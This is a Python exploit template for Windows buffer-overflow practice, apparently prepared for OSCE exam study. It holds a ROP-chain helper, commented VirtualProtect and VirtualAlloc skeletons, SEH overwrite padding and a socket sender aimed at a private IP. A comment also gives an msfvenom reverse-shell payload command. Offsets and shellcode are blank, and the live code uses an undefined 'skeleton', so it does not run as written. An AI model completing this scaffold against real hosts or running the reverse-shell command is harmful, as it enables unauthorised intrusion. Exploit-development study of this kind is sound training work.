#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
This is an exploit template.

References:
- https://epi052.gitlab.io/notes-to-self/blog/2020-05-14-osce-exam-practice-part-two/

Dependencies:
    pip install boofuzz
"""

from pwn import *
from struct import pack
from typing import List
import socket

bad_chars = [0, 0xA, 0xD, 0x2B, 0x25, 0x26, 0x3D]


class RopChain:
    def __init__(self, base=None, pack_str="<I", chain=b""):
        self.chain = chain
        self.base = base or 0
        self.pack_str = pack_str

    def __iadd__(self, other):
        if isinstance(other, int):
            self.chain += self._pack_32(self.base + other)
        elif isinstance(other, bytes):
            self.chain += other
        else:
            raise NotImplementedError
        return self

    def __len__(self) -> int:
        return len(self.chain)

    @staticmethod
    def p32(address) -> bytes:
        return pack("<I", address)

    def _pack_32(self, address) -> bytes:
        return pack(self.pack_str, address)

    def append_raw(self, address):
        """just ignore the base address; useful for actual values in conjunction with pop r32"""
        self.chain += pack(self.pack_str, address)


def get_connection(ip: str, port: int) -> socket.socket:
    sock = None
    while sock is None:
        try:
            sock = socket.create_connection((ip, port))
        except ConnectionRefusedError:
            continue
    return sock


def sanity_check(byte_str: bytes, bad_chars: List[int]):
    """Check if bad bytes are in byte string."""
    baddies = list()

    for bc in bad_chars:
        if bc in byte_str:
            log.info(f"[!] bad char found: {hex(bc)}")
            baddies.append(bc)

    if baddies:
        log.info(f"[=] {byte_str}")
        log.info("[!] Remove bad characters and try again")
        raise SystemExit


def get_payload() -> bytes:
    # msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -b '\x00\x0a\x20' -v shellcode -f python
    shellcode = b""

    return shellcode


def get_rop_chain() -> bytes:
    # BOOL VirtualProtect(
    #   LPVOID lpAddress,
    #   SIZE_T dwSize,
    #   DWORD  flNewProtect,
    #   PDWORD lpflOldProtect
    # );
    #
    # skeleton = RopChain()
    # skeleton += 0x41414141                # VirtualProtect address
    # skeleton += 0x42424242                # shellcode return address to return to after VirtualProtect is called
    # skeleton += 0x43434343                # lpAddress (same as above)
    # skeleton += 0x44444444                # dwSize (size of shellcode, 0x300 or so)
    # skeleton += 0x45454545                # flNewProtect (0x40)
    # skeleton += 0x46464646                # lpflOldProtect (some writable memory address)
    # -------------------------
    # -------------------------
    # LPVOID VirtualAlloc(
    #   LPVOID lpAddress,
    #   SIZE_T dwSize,
    #   DWORD  flAllocationType,
    #   DWORD  flProtect
    # );
    #
    # skeleton  = RopChain()
    # skeleton += 0x41414141                # VirtualAlloc address
    # skeleton += 0x42424242                # shellcode return address to return to after VirtualAlloc is called
    # skeleton += 0x43434343                # lpAddress (shellcode address)
    # skeleton += 0x44444444                # dwSize (0x1)
    # skeleton += 0x45454545                # flAllocationType (0x1000)
    # skeleton += 0x46464646                # flProtect (0x40)
    # -------------------------
    # -------------------------
    # BOOL WriteProcessMemory(
    #   HANDLE  hProcess,
    #   LPVOID  lpBaseAddress,
    #   LPCVOID lpBuffer,
    #   SIZE_T  nSize,
    #   SIZE_T  *lpNumberOfBytesWritten
    # );
    #
    # skeleton  = RopChain()
    # skeleton += 0x41414141                # WriteProcessMemory address
    # skeleton += 0x42424242                # shellcode return address to return to after WriteProcessMemory is called
    # skeleton += 0xffffffff                # hProcess (pseudo Process handle)
    # skeleton += 0x44444444                # lpBaseAddress (Code cave address)
    # skeleton += 0x45454545                # lpBuffer (shellcode address)
    # skeleton += 0x46464646                # nSize (size of shellcode)
    # skeleton += 0x47474747                # lpNumberOfBytesWritten (writable memory address, i.e. !dh -a MODULE)
    # -------------------------
    # -------------------------

    ropnop = 0x0
    offset_to_eip = 0

    rop = RopChain(chain=b"A" * (offset_to_eip - len(skeleton)))
    rop += skeleton.chain

    rop += 0x0
    ############################
    # EAX =>
    # EBX =>
    # ECX =>
    # EDX =>
    # ESI =>
    # EDI =>
    # -------------------------
    # skeleton[0] = 0x41414141
    # skeleton[1] = 0x42424242
    # skeleton[2] = 0x43434343
    # skeleton[3] = 0x44444444
    # skeleton[4] = 0x45454545
    # skeleton[5] = 0x46464646
    ############################

    rop += b"\x90" * 20
    rop += get_payload()

    sanity_check(rop.chain, bad_chars)

    return rop.chain


def get_seh_overwrite() -> bytes:
    total_len = 0
    offset_to_eip = 0

    seh_chain = b"A" * (offset_to_eip - 4)
    seh_chain += b"B" * 4  # nseh
    seh_chain += b"C" * 4  # seh - ppr or similar
    seh_chain += b"C" * (total_len - len(seh_chain))

    return seh_chain


def send_exploit(sock: socket.socket, buffer: bytes, read_response=False):
    sock.send(buffer)
    print(f"[+] sent {len(buffer)} bytes")

    if read_response:
        resp = sock.recv(4096)
        print("[*] response:")
        print(resp)


def main():
    conn = get_connection("192.168.0.218", 111)  # todo change ip/port
    send_exploit(conn, get_rop_chain())


if __name__ == "__main__":
    main()
    print("[*] Done!")
